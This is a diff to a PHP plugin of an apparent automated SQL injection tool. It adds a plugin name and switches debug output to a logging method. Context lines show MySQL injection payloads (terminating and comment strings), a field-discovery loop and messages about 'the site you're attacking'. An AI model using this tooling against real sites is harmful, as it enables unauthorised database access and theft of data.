@@ -4,6 +4,8 @@
 
 		class MySQL5 extends InjectionPlugin {
 
+			const		PLUGIN_NAME	= "MySQL5 Standard Plugin by Juan Stange";
+
 			private $_affectedField				= NULL;
 			private $_maxFields					= NULL;
 			private $_table						= NULL;
@@ -17,6 +19,10 @@
 			private $_terminatingPayloads		= array("LIMIT 1,1", " ORDER BY 1", "LIMIT 1,1 ORDER BY 1");
 			private $_currTerminatingPayload = NULL;
 			private $_commentPayloads			= array("/*","--","#");
+
+			public function getPluginName(){
+				return self::PLUGIN_NAME;
+			}
 
 			/**
 			*Checkout if the given URL by the HttpAdapter is vulnerable or not
@@ -54,20 +60,20 @@
 
 								$injection	= $this->makeDiscoveryInjection();
 						
-								$this->dEcho("[$variable] Attempt:\t$i");
+								$this->log("[$variable] Attempt:\t$i",0);
 
 								$matches = $this->analyzeInjection($injection);
 
 								if(isset($matches[0])){
 
-									$this->dEcho("FOUND SQL INJECTION!!!\n");
-									$this->dEcho("Affected Variable:\t$variable");
-									$this->dEcho("Affected Fields:\t".implode($matches,","));
-									$this->dEcho("Field Count:\t$i");
+									$this->log("FOUND SQL INJECTION!!!");
+									$this->log("Affected Variable:\t$variable");
+									$this->log("Affected Fields:\t".implode($matches,","));
+									$this->log("Field Count:\t$i");
 
 									$field = $this->pickRandomValue($matches);
 
-									$this->dEcho("Picking field \"$field\" to perform further analysis ...");
+									$this->log("Picking field \"$field\" to perform further analysis ...");
 
 									//Actually we can have a series of childNodes here any field is good, so we just pick
 									//a random field.
@@ -452,9 +458,9 @@
 
 					$value = mt_rand(0,10);
 
-					$this->dEcho("WARNING! Variable value is not set, this will probably make this plugin not to work!");
-					$this->dEcho("Be sure to specify a valid value for the URL variable of the site you're attacking.");
-					$this->dEcho("Assuming random value for variable $variable. Value is: $value");
+					$this->log("WARNING! Variable value is not set, this will probably make this plugin not to work!",2,"yellow");
+					$this->log("Be sure to specify a valid value for the URL variable of the site you're attacking.",2,"yellow");
+					$this->log("Assuming random value for variable $variable. Value is: $value",2,"yellow");
 
 				}
 
@@ -472,18 +478,12 @@
 				$openTag		= $this->getOpenTag();
 				$closeTag	= $this->getCloseTag();
 				
-				$this->dEcho("String identifier is: $openTag - $closeTag");
+				$this->log("String identifier is: $openTag - $closeTag",0,"white");
 				
 				$parser->setOpenTag($openTag);
 				$parser->setCloseTag($closeTag);
 
 				return $parser->getResult();
-
-			}
-
-			private function dEcho($str){
-
-				echo $str."\n";
 
 			}
 
